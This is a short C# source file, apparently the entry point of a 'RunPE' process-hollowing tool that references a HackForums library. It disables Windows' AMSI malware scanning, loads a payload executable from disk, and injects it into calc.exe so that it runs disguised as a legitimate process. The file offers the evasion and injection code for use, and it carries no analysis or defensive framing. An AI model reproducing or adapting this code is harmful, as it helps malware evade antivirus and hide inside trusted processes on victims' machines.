using HackForums.gigajew;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace RunPE
{
    public static class Program
    {

        public static int Main(string[] args)
        {
            WinXComponents.DisableAMSI();

            string payloadFileName = "putty.exe";
            if(IntPtr.Size * 8 == 64)
            {
                payloadFileName = "putty64.exe";
            }
            var payload = File.ReadAllBytes(payloadFileName);
            string calculator = "C:\\Windows\\system32\\calc.exe";
            string[] arguments = null;
            bool hidden = false;

            WinXParameters parameters = WinXParameters.Create(payload, calculator, hidden, arguments);
            WinX86.Start(parameters);



            return 0;
        }

    }
}
